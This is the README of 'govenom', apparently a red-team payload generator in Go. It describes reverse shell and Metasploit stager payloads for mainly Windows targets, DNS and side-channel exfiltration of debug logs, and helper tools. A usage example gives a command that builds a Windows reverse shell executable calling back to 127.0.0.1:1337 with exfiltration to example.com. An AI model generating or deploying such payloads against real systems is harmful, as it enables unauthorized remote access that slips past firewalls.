<p align="center">
  <h2 align="center"><b>govenom</b></h3>
  <p align="center"><i>No clue about the target environment, installed shells, firewall rules? Uncommon CPU architecture?</br>Govenom has you covered!</i></p>
  <p align="center">
    <a href="https://github.com/erikgeiser/govenom/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/erikgeiser/govenom.svg?style=for-the-badge"></a>
    <a href="/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=for-the-badge"></a>
    <a href="https://github.com/erikgeiser/govenom/actions?workflow=build"><img alt="GitHub Actions" src="https://img.shields.io/github/workflow/status/erikgeiser/govenom/build?style=for-the-badge"></a>
    <a href="https://goreportcard.com/report/github.com/erikgeiser/govenom"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/erikgeiser/govenom?style=for-the-badge"></a>
    <a href="http://pkg.go.dev/github.com/erikgeiser/govenom"><img alt="Go Doc" src="https://img.shields.io/badge/godoc-reference-blue.svg?style=for-the-badge"></a>
  </p>
</p>

`govenom` is a `msfvenom`-inspired payload generator written in
Go. This makes it easy to cross-compile static binaries for a
variety of target platforms, although currently `govenom` has a
strong focus on Windows as payload target platform.

## Payloads

Currently, three payloads are supportet:

* **rsh:** A simple reverse TCP shell. It selects one of the most
common shells and makes it available via TCP or UDP connection.
* **xrsh:** An extenden robust reverse TCP shell. A simple heuristic
determines the must suitable shell executable, taking shells that
are installed buth not in `$PATH` into account. In contrast to most
other available shells out there, additional info can be sent via
alternative communication channels via the exfiltration mechanism
(see relevant section below). For example, if no shell could be
detected or the connection could not be established due to a
firewall, the corresponding error can be exfiltrated via DNS.
* **stager**: A TCP based shellcode stager that is compatible with
Metasploits `exploits/multi/handler` with a `meterpreter/reverse_tcp`
payload. It first reads a 4 Byte shellcode length and then the
shellcode itself from a TCP connection and executes it. Currently,
this is only available for Windows targets.

## Exfiltration

Sometimes a shell you placed on target system does not appear to
connect back. Most of the time this results in a lot of trial and
error. Maybe the firewall blocks TCP connections, or maybe one of
the ports you tried. Maybe you expected `powershell` to be present
but only `cmd` is there. The solution to problem is the `govenom`
debug log exfiltration mechanism which can optionally be used with
`xrsh` and `stager` payloads. It lets you configure an arbitrary
amount of exfiltration strategies of the following types:

* **`stdout`/`stderr`:** If you can capture the output of your
payload when it's executed, you can output debug logs via
`stdout/stderr`.

* **DNS:** The most useful exfiltration type because noone blocks
DNS. Messages are encoded and split into parts which can be put
together again by the `govenom` tool `dnslogger` (see section
below).

* **File:** Write the debug information into a file on the target
system. This is for example useful if you can recover files via a
local file inclusion vulnerability.

* **Net (`dial`):** Send the debug log via a TCP or UDP connection that's
different from the original connect back connection.

## Tools

`govenom` also provides some tools to work with the payloads:

* **dnslogger:** The `dnslogger` tool decodes and recombines messages
that were exfiltrated via DNS.

* **pusher:** The `pusher` tool can serve and deliver `meterpreter`
shellcode generated using `msfvenom` to the `govenom` stager payload.

## Usage

Run `go run govenom.go` for detailed usage information. The following
example generates the extended reverse shell for a 32-Bit Windows
target that connects back to `127.0.0.1:1337` and uses multiple debug
exfiltration strategies:

```bash
# generate a payload
go run ./govenom.go payload xrsh -d 127.0.0.1:1337 \
    --os windows --arch 386 \
    --exil dns:example.com,stdout,dial:udp:127.0.0.1:1234
    -o revsh.exe

# run the 
go run ./govenom.go tool dnslogger
```

**Note:** `go` has to be installed to run `govenom` itself and it is
also used by `govenom` itself to build the selected payloads.

## Plans

* Connection encryption
* Reverse shell listener like `ncat` with loggin capabilities
* Embedding payload code into the `govenom` binary